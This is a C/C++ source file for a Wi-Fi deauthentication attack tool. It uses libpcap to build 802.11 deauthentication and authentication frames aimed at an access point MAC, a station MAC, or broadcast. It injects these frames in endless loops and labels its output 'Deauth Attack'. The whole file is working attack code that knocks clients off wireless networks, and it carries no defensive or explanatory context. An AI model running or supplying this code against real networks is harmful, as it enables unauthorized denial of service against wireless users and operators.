#include <stdio.h>
#include <stdlib.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include "parse.h"
void PrintMAC(uint8_t *mac){
    printf("%02x:%02x:%02x:%02x:%02x:%02x \n",mac[0], mac[1],mac[2],mac[3],mac[4],mac[5]);
}
DeauthPacket MakePacket(int make_type, char** arg){
    DeauthPacket Packet;
    Packet.radiotap.reversion = 0;
    Packet.radiotap.pad = 0;
    Packet.radiotap.len = 8;
    Packet.radiotap.present = 0x00000000;

//    Packet.beacon.type = htons(0xa000);
    Packet.beacon.type = htons(0xc000);
    Packet.beacon.padding = 0;
    Packet.beacon.seq_num = 0;
    sscanf(arg[2],"%x:%x:%x:%x:%x:%x",
            &Packet.beacon.BSSID[0],
            &Packet.beacon.BSSID[1],
            &Packet.beacon.BSSID[2],
            &Packet.beacon.BSSID[3],
            &Packet.beacon.BSSID[4],
            &Packet.beacon.BSSID[5]);
    if(make_type == BROADCAST){
        memcpy(Packet.beacon.src_mac,Packet.beacon.BSSID,sizeof(uint8_t)*6);
        memset(Packet.beacon.des_mac,0xFF,6);
    }
    else if(make_type == UNICAST){
        sscanf(arg[3],"%x:%x:%x:%x:%x:%x",
                &Packet.beacon.des_mac[0],
                &Packet.beacon.des_mac[1],
                &Packet.beacon.des_mac[2],
                &Packet.beacon.des_mac[3],
                &Packet.beacon.des_mac[4],
                &Packet.beacon.des_mac[5]);
                memcpy(Packet.beacon.src_mac,Packet.beacon.BSSID,sizeof(uint8_t)*6);
    }
    else if(make_type == UNICAST2){
        sscanf(arg[2],"%x:%x:%x:%x:%x:%x",
                &Packet.beacon.des_mac[0],
                &Packet.beacon.des_mac[1],
                &Packet.beacon.des_mac[2],
                &Packet.beacon.des_mac[3],
                &Packet.beacon.des_mac[4],
                &Packet.beacon.des_mac[5]);
        sscanf(arg[3],"%x:%x:%x:%x:%x:%x",
                &Packet.beacon.src_mac[0],
                &Packet.beacon.src_mac[1],
                &Packet.beacon.src_mac[2],
                &Packet.beacon.src_mac[3],
                &Packet.beacon.src_mac[4],
                &Packet.beacon.src_mac[5]);
        memcpy(Packet.beacon.BSSID,Packet.beacon.src_mac,sizeof(uint8_t)*6);
    }
    Packet.manage.fixed = htons(0x0700);

    return Packet;
}
DeauthPacketAuth MakeAuthPacket(char** arg){
    DeauthPacketAuth Packet;
    Packet.radiotap.reversion = 0;
    Packet.radiotap.pad = 0;
    Packet.radiotap.len = 8;
    Packet.radiotap.present = 0x00000000;
    Packet.beacon.type = htons(0xb000);
    Packet.beacon.padding = 0;
    sscanf(arg[2],"%x:%x:%x:%x:%x:%x",
            &Packet.beacon.des_mac[0],
            &Packet.beacon.des_mac[1],
            &Packet.beacon.des_mac[2],
            &Packet.beacon.des_mac[3],
            &Packet.beacon.des_mac[4],
            &Packet.beacon.des_mac[5]);
    sscanf(arg[3],"%x:%x:%x:%x:%x:%x",
            &Packet.beacon.src_mac[0],
            &Packet.beacon.src_mac[1],
            &Packet.beacon.src_mac[2],
            &Packet.beacon.src_mac[3],
            &Packet.beacon.src_mac[4],
            &Packet.beacon.src_mac[5]);
    memcpy(Packet.beacon.BSSID,Packet.beacon.des_mac,sizeof(uint8_t)*6);
    Packet.beacon.seq_num = 0;
    Packet.manage.algo = 0x0000;
    Packet.manage.seq = htons(0x0100);
    Packet.manage.status = 0x0000;
    return Packet;
}

void Parse(int make_type, char** argv){
    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
    if (handle == NULL) {
       fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
       exit(-1);
    }
    if(make_type == AUTH){
        DeauthPacketAuth Packet = MakeAuthPacket(argv);
        printf("[+]Auth - UNICAST\n");
        printf("[+]AP MAC : ");
        PrintMAC(Packet.beacon.BSSID);
        printf("[+]Station MAC : ");
        PrintMAC(Packet.beacon.src_mac);
        while(1){
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Packet), sizeof(DeauthPacketAuth));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }
    else if(make_type == UNICAST){
        DeauthPacket Packet = MakePacket(UNICAST,argv);
        DeauthPacket Packet2 = MakePacket(UNICAST2,argv);
        printf("[+]Deauth Attack - UNICAST\n");
        printf("[+]AP MAC : ");
        PrintMAC(Packet.beacon.BSSID);
        printf("[+]Station MAC : ");
        PrintMAC(Packet2.beacon.BSSID);
        while(1){
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Packet), sizeof(DeauthPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
              int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Packet2), sizeof(DeauthPacket));
            if (res2 != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(handle));
            }
        }
    }
    else{
        DeauthPacket Packet = MakePacket(make_type,argv);
        printf("[+]Deauth Attack - BROADCAST\n");
        printf("[+]AP MAC : ");
        PrintMAC(Packet.beacon.BSSID);
        printf("[+]Station MAC : ");
        PrintMAC(Packet.beacon.des_mac);
        while(1){
            int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Packet), sizeof(DeauthPacket));
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
            printf("Deauth!!...\n");
        }
    }


}
